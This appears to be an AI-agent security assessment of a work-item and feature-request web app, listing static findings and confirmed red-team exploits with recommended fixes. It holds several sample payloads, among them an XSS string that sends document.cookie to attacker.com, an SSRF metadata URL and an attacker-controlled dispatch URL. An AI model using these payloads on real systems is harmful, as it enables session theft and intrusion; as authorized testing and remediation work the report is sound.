# Attack Surface Map — dev-crew Source App
**Generated by:** pen-tester agent  
**Date:** 2026-06-01  
**Scope:** White-box static analysis of `Source/Backend/` and `Source/Shared/`  
**OWASP Focus:** A01 (Broken Access Control), A03 (Injection), A07 (Auth Failures), A08 (Data Integrity)  

---

## Scope Notes

- **No authentication layer exists in the application.** This is the root cause of PEN-001 through PEN-004 and amplifies every other finding.
- **In-memory store only.** No database, no SQL injection surface. All injection risk is business-logic/data-integrity.
- **No shell/OS/external HTTP calls.** SSRF, command injection, and SSRF are out of scope.
- **Security.config objective `/api/work-items/:id/transition`** — this endpoint **does not exist** in the backend. The config references it but it was never implemented. The state machine is driven by discrete endpoints: `/route`, `/assess`, `/approve`, `/reject`, `/dispatch`.

### PEN-001: No Authentication on Any Endpoint
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` (entire file — no auth middleware registered)
- **Vulnerability Description:**  
  The Express application registers zero authentication middleware. Every endpoint — including state-transition actions (`approve`, `reject`, `dispatch`) and data-modification actions (`PATCH`, `DELETE`) — is fully accessible without any credential. No session, no API key, no JWT, no IP restriction.

  From `app.ts`:
  ```
  app.use(express.json());       // JSON body parser
  app.use((req, _res, next) => { // request logging only
    logger.debug(...)
    next();
  });
  app.use('/api/work-items', workItemsRouter);   // no auth guard
  app.use('/api/work-items', workflowRouter);    // no auth guard
  app.use('/api/dashboard', dashboardRouter);    // no auth guard
  app.use('/api/intake', intakeRouter);          // no auth guard
  ```

- **Potential Exploit Path:**
  1. Any HTTP client (curl, browser, script) issues a request to any endpoint.
  2. Express processes the request with no credential check.
  3. The request succeeds with full data access and state mutation authority.

- **Red Team Handoff Notes:**
  - Attempt every endpoint below without any Authorization header or cookie.
  - Confirm all return data / accept mutations without 401:
    - `GET http://localhost:3001/api/work-items`
    - `POST http://localhost:3001/api/work-items` with `{"title":"t","description":"desc","type":"bug","priority":"high","source":"manual"}`
    - `POST http://localhost:3001/api/work-items/<id>/approve`
    - `DELETE http://localhost:3001/api/work-items/<id>`
  - This finding is the prerequisite for PEN-002 through PEN-006.

### PEN-002: No Authorization / RBAC — Privileged Actions Unauthenticated
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` lines 94–141 (approve), 144–208 (reject), 212–296 (dispatch)
- **Vulnerability Description:**  
  Even if authentication were added, there is no RBAC or ABAC layer. All callers are treated identically regardless of role. High-privilege operations — manually approving a work item, rejecting it, dispatching to a team — require no elevated permission. Any caller that can reach the network can perform these actions.

  Specifically affected endpoints:
  - `POST /api/work-items/:id/approve` — manually approves any item, bypassing assessment
  - `POST /api/work-items/:id/reject` — rejects any item with arbitrary reason
  - `POST /api/work-items/:id/dispatch` — dispatches any approved item to a team
  - `DELETE /api/work-items/:id` — soft-deletes any item

- **Potential Exploit Path:**
  1. Attacker identifies a work item ID (via PEN-006 enumeration or guessing the `WI-NNN` docId pattern).
  2. Issues `POST /api/work-items/<id>/approve` with no credentials.
  3. Item transitions to `approved` status regardless of its current assessment result.
  4. Follows with `POST /api/work-items/<id>/dispatch` to assign it to `TheATeam` or `TheFixer`.
  5. Legitimate workflow (assessment pod, routing) is entirely circumvented.

- **Red Team Handoff Notes:**
  - Create a fresh item via `POST /api/work-items`, note its `id`.
  - Call `POST /api/work-items/<id>/approve` with `{"reason": "injected approval"}`.
  - Confirm response shows `status: "approved"` with no 401/403.
  - Then `POST /api/work-items/<id>/dispatch` with `{"team": "TheATeam"}`.
  - Confirm `status: "in-progress"`, `assignedTeam: "TheATeam"` — full pipeline bypass.

### PEN-003: Intake Webhooks Have No Secret Validation
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/intake.ts` lines 11–31 (Zendesk), 34–54 (automated)
- **Vulnerability Description:**  
  The Zendesk and automated intake endpoints accept work items from any caller without validating a shared secret, HMAC signature, or IP allowlist. The only validation is presence of `title` and `description`. An attacker can submit arbitrary work items by impersonating a webhook source, injecting data into the pipeline.

  Neither endpoint sets `source` from the caller — `source` is hardcoded to `zendesk`/`automated` — but `type` and `priority` accept any value from the request body (with no enum validation!):
  ```typescript
  type: body.type || WorkItemType.Bug,        // body.type is unchecked!
  priority: body.priority || WorkItemPriority.Medium,  // body.priority is unchecked!
  ```

  This means an attacker can also inject items with arbitrary `type` and `priority` values, since neither intake handler validates the enum fields. Compare to the `POST /api/work-items` handler which validates both with `Object.values(WorkItemType).includes(...)`.

- **Potential Exploit Path:**
  1. Attacker sends `POST http://localhost:3001/api/intake/zendesk` with body `{"title":"Inject","description":"Injected via fake webhook","type":"<arbitrary>","priority":"critical"}`.
  2. No HMAC signature or API key is required.
  3. Item is created with `source: "zendesk"`, polluting the legitimate intake queue.
  4. The unvalidated `type`/`priority` fields may cause downstream processing anomalies.

- **Red Team Handoff Notes:**
  - `POST /api/intake/zendesk` with `{"title":"FAKE","description":"fake zendesk ticket","type":"invalid-type","priority":"invalid-priority"}` — confirm 201 Created with the invalid enum values stored verbatim.
  - `POST /api/intake/automated` same pattern.
  - Also try omitting `type`/`priority` entirely to confirm default fallback.
  - Verify no `X-Hub-Signature` or similar header is checked.

### PEN-004: Unauthenticated Fast-Track Route Override Bypasses Assessment Pod
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` line 57; `Source/Backend/src/services/router.ts` lines 66–88
- **Vulnerability Description:**  
  The `/route` endpoint accepts an optional `overrideRoute` field in the request body. When `overrideRoute: "fast-track"` is supplied, the router service (`classifyRoute`) skips the automatic classification logic and immediately transitions the item from `backlog` → `approved`, completely bypassing the assessment pod.

  From `router.ts`:
  ```typescript
  export function classifyRoute(item, overrideRoute?) {
    if (overrideRoute) {
      return {
        route: overrideRoute,
        targetStatus: overrideRoute === WorkItemRoute.FastTrack
          ? WorkItemStatus.Approved      // direct to approved!
          : WorkItemStatus.Proposed,
      };
    }
    // ... normal classification
  }
  ```

  There is no access control protecting who can supply `overrideRoute`. Any caller can fast-track any backlog item without authentication.

- **Potential Exploit Path:**
  1. Create a work item: `POST /api/work-items` → get `id`.
  2. Send `POST /api/work-items/<id>/route` with body `{"overrideRoute": "fast-track"}`.
  3. Item transitions `backlog → routing → approved` in one call.
  4. Assessment pod, domain expert, and requirements reviewer are entirely bypassed.
  5. Item is now dispatchable immediately.

- **Red Team Handoff Notes:**
  - Create a complex `feature` type item (which normally requires full-review).
  - Call `POST /api/work-items/<id>/route` with `{"overrideRoute": "fast-track"}`.
  - Confirm response shows `status: "approved"`, `route: "fast-track"`.
  - This is the canonical exploit for objective: "Bypass work item state machine to reach an invalid status."

### PEN-005: Manual Approve Bypasses Assessment Pod for Items in `proposed` or `reviewing`
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` lines 94–142; `Source/Shared/types/workflow.ts` lines 217–219
- **Vulnerability Description:**  
  The `POST /api/work-items/:id/approve` endpoint performs a state machine transition check using `isValidTransition`. Per `VALID_STATUS_TRANSITIONS`:
  ```
  proposed  → [reviewing, approved, rejected]
  reviewing → [approved, rejected]
  routing   → [proposed, approved]
  ```

  Items in `proposed`, `reviewing`, or `routing` can all be manually approved without going through the assessment pod. The approval endpoint requires no authentication and no reason field (reason is optional). The assessment pod's verdict is entirely ignored when this endpoint is called directly.

- **Potential Exploit Path:**
  1. Create item, route it (goes to `proposed` via full-review).
  2. Without calling `/assess`, call `POST /api/work-items/<id>/approve` with `{"reason": "skip assessment"}`.
  3. Item jumps from `proposed` → `approved` with the assessment pod verdict never being recorded.
  4. Now dispatchable, bypassing quality gates.

- **Red Team Handoff Notes:**
  - Create a `feature` item (always full-review).
  - Route it → confirm `status: "proposed"`.
  - Call `/approve` directly without calling `/assess` first.
  - Confirm the item is now `approved` with NO assessment records in `assessments[]`.
  - Also try approving from `routing` status: create item, do NOT call `/route`, then manually set it to routing... actually routing is a transient state, so try approving from `proposed` as above.

### PEN-006: Unbounded Pagination Allows Full Dataset Enumeration
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts` lines 68–74; `Source/Backend/src/routes/dashboard.ts` lines 17–18
- **Vulnerability Description:**  
  The `GET /api/work-items` and `GET /api/dashboard/activity` endpoints accept `page` and `limit` query parameters with no upper bound on `limit`. An attacker can retrieve all work items in a single request.

  ```typescript
  const pagination = {
    page: req.query.page ? parseInt(req.query.page as string, 10) : 1,
    limit: req.query.limit ? parseInt(req.query.limit as string, 10) : 20,  // no cap!
  };
  const result = store.findAll(filters, pagination);
  ```

  The `findAll` store function has no `MAX_LIMIT` guard. This enables:
  - Full data enumeration with a single request: `?limit=999999`
  - Objective from `security.config.yml`: "Enumerate all work items without pagination limit enforcement" — directly achievable.

- **Potential Exploit Path:**
  1. `GET http://localhost:3001/api/work-items?limit=999999`
  2. All non-deleted work items returned in one response.
  3. Similarly: `GET /api/dashboard/activity?limit=999999` returns all change history for all items.

- **Red Team Handoff Notes:**
  - Seed 50+ items in the system.
  - `GET /api/work-items?limit=999999` — confirm `total` matches full count and `data.length === total`.
  - `GET /api/dashboard/activity?limit=999999` — confirm all change history entries returned.
  - Confirm `GET /api/dashboard/queue` returns ALL items grouped by status with no pagination (no pagination exists on this endpoint at all).

### PEN-007: Cascade Auto-Dispatch Triggered by Rejection — Business Logic Flaw
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` lines 192–200; `Source/Backend/src/services/dependency.ts` lines 251–315
- **Vulnerability Description:**  
  When a work item is **rejected**, `onItemResolved(id)` is called (workflow.ts line 193). This function checks all items that the rejected item blocks, and auto-dispatches any that are now unblocked and in `approved` status.

  `DISPATCH_TRIGGER_STATUSES = [Completed, Rejected]` — both trigger cascade dispatch.

  This means: **rejecting a blocker causes its dependents to be auto-dispatched to implementation teams**. From a business logic standpoint, when a blocker is rejected (not completed), dependent items may not be ready for dispatch — the rejection may indicate the entire dependency chain is invalid. Instead, the cascade blindly dispatches dependents.

  Additionally, an attacker can exploit this:
  1. Create a chain of items where item A blocks item B (B is `approved`).
  2. Reject item A via `POST /api/work-items/A/reject`.
  3. B is automatically dispatched to a team — without any human decision.

- **Potential Exploit Path:**
  1. Create item A (blocker) and item B (dependent, `blockedBy: [A]`).
  2. Route both through to `approved` status.
  3. `POST /api/work-items/A/reject` with `{"reason": "forced rejection"}`.
  4. Observe that B is automatically transitioned to `in-progress` and assigned to a team.
  5. This trigger requires no authentication (per PEN-001).

- **Red Team Handoff Notes:**
  - Create two items; route+approve both.
  - Add dependency: `POST /api/work-items/B/dependencies` `{"action":"add","blockerId":"A"}`.
  - Reject A: `POST /api/work-items/A/reject` `{"reason":"test"}`.
  - Fetch B: `GET /api/work-items/B` — confirm `status: "in-progress"` was set automatically without human dispatch decision.
  - Note the cascade log message: `"Cascade: auto-dispatched dependents after rejection"`.

### PEN-008: Soft-Deleted Blocker Permanently Blocks Dependent Items
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/dependency.ts` lines 64–75; `Source/Backend/src/store/workItemStore.ts` lines 23–27
- **Vulnerability Description:**  
  When a blocker work item is soft-deleted (`DELETE /api/work-items/<blockerId>`), `findById` returns `undefined` for that ID. The `computeHasUnresolvedBlockers` function treats a missing blocker as an unresolved blocker:

  ```typescript
  for (const link of (item.blockedBy ?? [])) {
    const blocker = store.findById(link.blockerItemId);
    if (!blocker || !RESOLVED_STATUSES.includes(blocker.status)) {
      return true;   // deleted blocker → !blocker → returns true → permanently blocked!
    }
  }
  ```

  A dependent item whose blocker is deleted can never be dispatched — it will always report `hasUnresolvedBlockers: true` and dispatch is permanently gated. The dependency link is not cleaned up by the soft-delete operation, so there is no automated recovery path.

  The only recovery is to explicitly call `POST /api/work-items/<id>/dependencies` with `{"action":"remove","blockerId":"<deletedId>"}` — but this also calls `store.findById(blockerId)` which returns undefined, and the remove operation relies on cleanup of the reverse index which requires the blocker to exist.

  Looking at `removeDependency`:
  ```typescript
  const blocker = store.findById(blockerId);  // undefined for deleted item
  // ...cleanup happens best-effort
  if (blocker) {
    const newBlocks = ...  // blocker is null, this is skipped
  }
  ```

  The `blockedBy` entry IS correctly removed from the blocked item, so removal still works functionally. But the `hasUnresolvedBlockers` computation would have left the item gated until this manual cleanup.

- **Potential Exploit Path:**
  1. Create item A (blocker) and item B (dependent).
  2. `POST /api/work-items/B/dependencies` `{"action":"add","blockerId":"A"}`.
  3. Route + approve B.
  4. `DELETE /api/work-items/A` — soft-delete the blocker.
  5. `POST /api/work-items/B/dispatch` — confirm dispatch is blocked with "unresolved dependencies".
  6. B is now permanently blocked with no way for the system to auto-recover.

- **Red Team Handoff Notes:**
  - Follow the steps above.
  - Confirm `GET /api/work-items/B/ready` returns `{"ready": false}` even though blocker is deleted.
  - This is a correctness flaw the red-teamer should confirm causes a real stuck-state.

### PEN-009: O(N²) DoS via Chained Dependency Flooding
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/dependency.ts` lines 29–56 (`detectCycle` BFS)
- **Vulnerability Description:**  
  Every call to `addDependency` performs a BFS cycle detection traversal (`detectCycle`). The BFS starts from `fromId` and follows all `blocks` edges. In the worst case (a linear chain of N items), adding the N-th dependency requires traversing O(N) nodes. Creating N items and chaining them requires O(N²) total BFS work.

  Since all endpoints are unauthenticated (PEN-001), any external caller can:
  1. Create M items via `POST /api/work-items` in bulk.
  2. Chain them into a linear dependency sequence.
  3. Each chain extension takes O(N) BFS time.
  4. With N=1000 items, the last `addDependency` call processes ~1000 nodes.

  There is no rate limiting, no graph depth limit, and no concurrency guard.

- **Potential Exploit Path:**
  1. Create 500 work items via rapid `POST /api/work-items` calls.
  2. Chain them: add dependency A→B, B→C, C→D, … (each `addDependency` grows BFS cost).
  3. The 500th chain link triggers a BFS traversal of ~500 nodes.
  4. Repeat with fresh chains to progressively degrade server CPU.

- **Red Team Handoff Notes:**
  - Script a loop: create 100 items, chain them linearly via `POST /api/work-items/:id/dependencies`.
  - Measure response latency as the chain grows.
  - Confirm no rate limiting or depth limit is enforced.
  - Node.js is single-threaded; heavy BFS blocks the event loop and denies service to concurrent requests.

### PEN-010: `/api/search` Endpoint Called by Frontend But Missing from Backend
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Frontend/src/api/client.ts` line 101–104; `Source/Backend/src/app.ts` (no `/api/search` route registered)
- **Vulnerability Description:**  
  The frontend API client calls `GET /api/search?q=<query>` for the `DependencyPicker` typeahead:
  ```typescript
  searchItems(q: string): Promise<{ data: WorkItem[] }> {
    const params = new URLSearchParams({ q });
    return request(`/search?${params.toString()}`);
  }
  ```

  This endpoint **does not exist** in the backend. Express will return a 404 HTML page, and the frontend's `request()` helper will throw. This means:
  - The DependencyPicker feature is non-functional (calls a missing route).
  - The `q` parameter (user-controlled input) is never sanitized because it never reaches a backend handler — but if the endpoint is later implemented naively (e.g., filtering by regex), the lack of input validation would create a ReDoS or injection risk.

  Additionally, since Express has no explicit 404 handler registered in `app.ts`, the default Express 404 behavior returns `Cannot GET /api/search` as plain text, potentially leaking framework internals.

- **Potential Exploit Path:**
  1. `GET http://localhost:3001/api/search?q=test` — confirms 404 with Express default message.
  2. Future implementation risk: if search uses `new RegExp(q)` without sanitization, a `q` value like `(a+)+$` causes ReDoS.

- **Red Team Handoff Notes:**
  - `GET /api/search?q=anything` — confirm 404 and what response body is returned.
  - Try `GET /api/search?q=<script>alert(1)</script>` — confirm response does not reflect the XSS payload (since no handler exists, it shouldn't).
  - Flag to development: this is a missing feature that must be implemented with input validation.

### PEN-011: Prometheus `/metrics` Endpoint Publicly Accessible
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` lines 34–37
- **Vulnerability Description:**  
  The Prometheus metrics endpoint is registered without authentication:
  ```typescript
  app.get('/metrics', async (_req, res) => {
    res.set('Content-Type', registry.contentType);
    res.end(await registry.metrics());
  });
  ```

  The metrics expose operational intelligence useful for reconnaissance:
  - `workflow_items_created_total{source, type}` — reveals intake volume by source
  - `workflow_items_assessed_total{verdict}` — reveals approval vs rejection ratio
  - `workflow_items_dispatched_total{team}` — reveals team load
  - `workflow_dispatch_gating_events_total{event}` — reveals how often items are blocked
  - `workflow_cycle_detection_events_total{detected}` — reveals dependency complexity

- **Potential Exploit Path:**
  1. `GET http://localhost:3001/metrics` — no auth required.
  2. Parse Prometheus text format to understand system state without viewing the API directly.
  3. Use dispatch ratios and team load to infer organizational activity patterns.

- **Red Team Handoff Notes:**
  - `GET /metrics` — confirm unauthenticated access and document which metric labels expose sensitive counts.
  - This is low severity in isolation but becomes medium when combined with PEN-001 for a full reconnaissance chain.

### PEN-012: Internal Service Error Messages Forwarded Verbatim to Client
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` lines 59–63, 87–91, 137–141, 203–207, 291–295
- **Vulnerability Description:**  
  All workflow route handlers catch exceptions and forward the internal error message directly to the client:
  ```typescript
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : 'Internal server error';
    res.status(500).json({ error: message });  // internal message exposed!
  }
  ```

  Internal messages include references to internal IDs (e.g., `"Work item <uuid> not found"`), state names, and dependency paths. While not directly exploitable, this enables enumeration and aids attackers in understanding internal state.

- **Red Team Handoff Notes:**
  - Trigger various error conditions (invalid ID, wrong status) and document what error message text is returned.
  - Compare the global `errorHandler` (`error: 'Internal server error'`) vs route-level handlers (verbatim message).

### PEN-013: NaN/Zero Pagination Parameters Cause Silent Empty Results
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts` lines 69–71
- **Vulnerability Description:**  
  Pagination parameters are parsed via `parseInt` with no NaN/range validation:
  ```typescript
  page: req.query.page ? parseInt(req.query.page as string, 10) : 1,
  limit: req.query.limit ? parseInt(req.query.limit as string, 10) : 20,
  ```

  - `?page=abc` → `parseInt('abc')` → `NaN` → `(NaN-1)*20 = NaN` → `slice(NaN, NaN+20)` → empty array `[]`.
  - `?limit=0` → `parseInt('0')` → `0` → `slice(0, 0)` → empty array, `totalPages = Math.max(1, Infinity) = Infinity`.
  - `?page=-1` → offset = `(-1-1)*20 = -40` → `slice(-40, -40+20) = slice(-40, -20)` → tail of array.
  - `?limit=-1` → `totalPages = Math.ceil(100 / -1) = -100` → `Math.max(1, -100) = 1` but `slice(0, -1)` returns all but last item.

  These conditions cause unexpected behavior that could confuse clients or enable partial data access via negative indexing.

- **Red Team Handoff Notes:**
  - `GET /api/work-items?page=abc` — confirm empty `data[]` returned with no error.
  - `GET /api/work-items?limit=0` — confirm empty results and `totalPages: Infinity`.
  - `GET /api/work-items?page=-5` — confirm unexpected slice behavior.
  - `GET /api/work-items?limit=-1` — confirm all items minus last are returned.

From `security.config.yml`:

| Objective | Applicable Finding(s) | Attack Path |

| Bypass work item state machine to reach an invalid status | PEN-004, PEN-005 | Use `overrideRoute: "fast-track"` to skip assessment pod; use `/approve` directly from `proposed` |

## Attack Chain: Full Pipeline Hijack (Combines PEN-001 + PEN-004 + PEN-002)

This is the highest-impact composite exploit for the red-teamer to attempt:

```
1. POST /api/work-items
   {"title":"Injected Feature","description":"Attacker-controlled work","type":"feature","priority":"critical","source":"manual"}
   → 201, item.id = "<uuid>"

2. POST /api/work-items/<uuid>/route
   {"overrideRoute": "fast-track"}
   → 200, status: "approved" (assessment pod bypassed entirely)

3. POST /api/work-items/<uuid>/dispatch
   {"team": "TheATeam"}
   → 200, status: "in-progress", assignedTeam: "TheATeam"
```

**Result:** Attacker creates a work item and dispatches it to an implementation team in 3 unauthenticated HTTP calls, with the assessment pod and all quality gates bypassed.

---

## Notes for Red-Teamer

1. **No cookies, no tokens needed** — all requests are bare HTTP. Use `curl` or any HTTP client.
2. **Work item IDs** are UUIDs (`id` field). DocIds follow pattern `WI-NNN` (sequential). Both are returned on creation.
3. **In-memory store** — server restart resets all data. Test in a single session.
4. **State machine is enforced** — you cannot directly PUT an arbitrary status. Use the workflow endpoints.
5. **Cascade dispatch** (PEN-007) requires the dependent to already be in `approved` status before the blocker is rejected.
6. **The `/api/work-items/:id/transition` endpoint in `security.config.yml` does not exist** — the actual transition endpoints are `/route`, `/assess`, `/approve`, `/reject`, `/dispatch`.

## Red Team Results

**Executed by:** red-teamer agent  
**Date:** 2026-06-01  
**Environment:** Ephemeral — `docker-compose.test.yml` → `portal/Backend/` (port 3001)  
**Chains Attempted:** 9  
**Objectives Achieved:** 4 / 4  
**Confirmed Breaches:** 7

> **SCOPE DISCREPANCY (Critical Process Finding):**  
> The pen-tester analyzed `Source/Backend/` (work-items state machine) but the test environment (`docker-compose.test.yml`) runs `portal/Backend/` (feature requests, bugs, cycles, pipeline-runs). All 13 pen-tester PEN-IDs reference routes that return **HTTP 404** in the live environment. The red-teamer pivoted to the live target and discovered equivalent (and in some cases more severe) vulnerabilities in the portal application. This discrepancy must be resolved — either the pen-tester must analyze `portal/Backend/`, or the docker-compose must be updated to run `Source/Backend/`.

### RED-001: No Authentication on Any Portal Endpoint
- **Severity:** Critical
- **Objective Achieved:** Yes
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `http://localhost:3001/api/feature-requests`, `/api/bugs`, `/api/cycles`, `/api/team-dispatches`, `/api/learnings`, `/api/pipeline-runs`, `/api/search`
- **Based On:** PEN-001 (equivalent in portal application)
- **Exploit Scenario:**
  1. Issue `GET http://localhost:3001/api/feature-requests` with no Authorization header, cookie, or token.
  2. Server responds HTTP 200 with full data payload: `{"data":[...]}`.
  3. Confirmed across ALL 8 API route families — zero 401/403 responses.
  4. Evidence: `POST /api/feature-requests` → HTTP 201 Created with no credentials.
- **Recommendation:** Implement an authentication middleware (JWT or session-based) mounted at the Express app level before all route handlers. Gate every non-health endpoint.

---

### RED-002: Unauthenticated Force-Approve Bypasses AI Voting System
- **Severity:** Critical
- **Objective Achieved:** Yes (Bypass work item state machine / approval gate)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST http://localhost:3001/api/feature-requests/FR-0002/force-approve`
- **Based On:** PEN-002, PEN-004, PEN-005 (equivalent in portal)
- **Exploit Scenario:**
  1. Create feature request FR-0002 via `POST /api/feature-requests` (no auth).
  2. Trigger AI voting via `POST /api/feature-requests/FR-0002/vote` — produces 4 **DENY** / 1 approve from AI agents.
  3. Regular `/approve` endpoint correctly rejects: `{"error":"Cannot approve: majority vote is not 'approve'. Approve: 1, Deny: 4"}`.
  4. Call `POST /api/feature-requests/FR-0002/force-approve` with no credentials — request succeeds.
  5. Response: `status: "approved"`, `human_approval_approved_at: "2026-06-01T08:52:37.799Z"` — 4 AI deny votes overridden.
  6. Any item, regardless of vote outcome, can be force-approved by any unauthenticated caller.
- **Recommendation:** Add authentication guard to `/force-approve`. This endpoint must require a privileged role (e.g., `product-owner` or `admin`). Regular `/approve` already enforces majority — `force-approve` must at minimum require authentication.

### RED-003: Unauthenticated Team Dispatch Injection with Attacker-Controlled Payload
- **Severity:** Critical
- **Objective Achieved:** Yes (Submit malformed assessment that bypasses routing)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST http://localhost:3001/api/team-dispatches`
- **Based On:** PEN-003 (equivalent), new finding — no analog in pen-tester map
- **Exploit Scenario:**
  1. `POST /api/team-dispatches` with body:
     ```json
     {
       "team": "TheATeam",
       "inputs": {"feature_request_id": "FR-0001", "injected_by": "red-team"},
       "actions_url": "http://attacker.com/red-team-payload",
       "workflow": "malicious-deploy.yml",
       "repo": "attacker/payload"
     }
     ```
  2. Server responds HTTP 201 with stored record: `{"id":"46857169-703f-478d-9e6f-bc5224de087a",...}`.
  3. Dispatch record is now visible in GET /api/team-dispatches with attacker-controlled `actions_url`, `workflow`, and `repo`.
  4. If `actions_url` is ever automatically triggered by the orchestrator, this is an SSRF / supply-chain injection vector.
  5. Confirmed: SSRF payload `actions_url: "http://169.254.169.254/latest/meta-data/"` stored successfully (no server-side fetch, stored only).
- **Recommendation:** Require authentication and authorization for dispatch creation. Validate `actions_url` against an allowlist of known GitHub Actions URLs. The `repo` and `workflow` fields must be validated against allowed repositories.

### RED-004: Unbounded Data Enumeration — No Pagination on Feature-Requests List
- **Severity:** Medium
- **Objective Achieved:** Yes (Enumerate all items without pagination limit)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET http://localhost:3001/api/feature-requests`
- **Based On:** PEN-006 (equivalent)
- **Exploit Scenario:**
  1. `GET /api/feature-requests` — no `limit` parameter accepted; query param `?limit=1` is silently ignored.
  2. All feature requests returned unconditionally regardless of any limit query param.
  3. Verified: 12 items seeded, all 12 returned even with `?limit=1`.
  4. Service layer calls `listFeatureRequests(db, {status, source})` with no pagination — returns entire table.
  5. `GET /api/bugs` behaves identically — no pagination limit enforced.
- **Recommendation:** Add a `limit`/`offset` parameter to all list endpoints with a server-enforced maximum (e.g., `Math.min(parseInt(limit)||20, 100)`). The `listFeatureRequests` service function must accept pagination parameters and pass them to the SQL query.

### RED-005: Unauthenticated Resource Modification (IDOR / No Ownership Check)
- **Severity:** High
- **Objective Achieved:** Yes (partial — modify any resource without ownership)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `PATCH http://localhost:3001/api/feature-requests/:id`, `DELETE /api/feature-requests/:id`
- **Based On:** PEN-002 (equivalent)
- **Exploit Scenario:**
  1. Resource FR-0014 created (simulating User A).
  2. `PATCH /api/feature-requests/FR-0014` with `{"description":"OWNED by red team"}` — HTTP 200, description modified.
  3. `DELETE /api/feature-requests/FR-0014` — HTTP 204, record permanently deleted.
  4. No ownership verification, no authentication, no RBAC — any caller can modify or delete any resource.
- **Recommendation:** Implement authentication and resource ownership checks. Only the creator (or an admin role) should be able to PATCH or DELETE a resource. Implement soft-delete with an audit trail rather than hard deletes.

### RED-006: Stored XSS via Unescaped User-Controlled Fields
- **Severity:** High
- **Objective Achieved:** Partial
- **Status:** Confirmed (Live Exploit — Stored Payload)
- **Target URL:** `POST http://localhost:3001/api/feature-requests` → `GET /api/feature-requests/:id`
- **Based On:** New finding — not in pen-tester map
- **Exploit Scenario:**
  1. `POST /api/feature-requests` with `{"title":"<script>alert(document.cookie)</script>XSS Test","description":"<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>"}`.
  2. Server responds HTTP 201, stores payload verbatim: `title: "<script>alert(document.cookie)</script>XSS Test"`.
  3. `GET /api/feature-requests/FR-0013` returns the raw payload; `Content-Type: application/json` (not HTML).
  4. If rendered in a frontend template without proper escaping, this executes in the victim's browser and exfiltrates cookies.
  5. The portal frontend (React) may or may not escape properly — server-side storage of raw HTML is confirmed.
- **Recommendation:** Sanitize user-controlled string fields server-side using a library like `dompurify` or `sanitize-html`. Strip HTML tags from `title`, `description`, and other text fields on ingest.

### RED-007: Prometheus Metrics Expose Full Route Map and Operational Intelligence
- **Severity:** Low
- **Objective Achieved:** Partial (reconnaissance enabler for RED-001 through RED-006)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET http://localhost:3001/metrics`
- **Based On:** PEN-011 (equivalent)
- **Exploit Scenario:**
  1. `GET http://localhost:3001/metrics` — HTTP 200, no authentication.
  2. Metrics reveal all route paths including undiscovered endpoints: `/:id/force-approve`, `/:id/vote`, etc.
  3. HTTP request counts, latencies by route, and status code distributions expose which endpoints are actively used.
  4. This reconnaissance was used to discover the undocumented `/force-approve` endpoint (RED-002).
- **Recommendation:** Gate `/metrics` behind network-level ACL or token-based access (e.g., `Authorization: Bearer <scrape-token>`). Do not expose internal route maps to unauthenticated callers.

### RED-009: Full Business Logic Takeover — 4-Step Unauthenticated Compromise Chain
- **Severity:** Critical
- **Objective Achieved:** Yes (all four security objectives achieved)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** Multiple endpoints
- **Based On:** RED-001 + RED-002 + RED-003 (composite)
- **Exploit Scenario:**
  1. `POST /api/feature-requests` — create attacker-controlled feature request FR-0014. No auth. HTTP 201.
  2. `POST /api/feature-requests/FR-0014/vote` — trigger AI voting (outcome doesn't matter). No auth. HTTP 200.
  3. `POST /api/feature-requests/FR-0014/force-approve` — override all AI votes, set status to `approved`. No auth. HTTP 200.
  4. `POST /api/team-dispatches` — inject dispatch record with `actions_url: "http://attacker.com/red-team-payload"`, `workflow: "malicious-deploy.yml"`, `repo: "attacker/payload"`. No auth. HTTP 201.
  5. **Net effect:** Attacker created a feature, bypassed all AI quality gates, and injected a team dispatch pointing to attacker infrastructure — entirely without credentials in 4 HTTP calls.
- **Recommendation:** This chain is only possible because of zero authentication across all endpoints. The fix is architectural: implement authentication middleware at the Express app level, add RBAC for privileged actions (`force-approve`, dispatch creation), and validate `actions_url` against an allowlist.
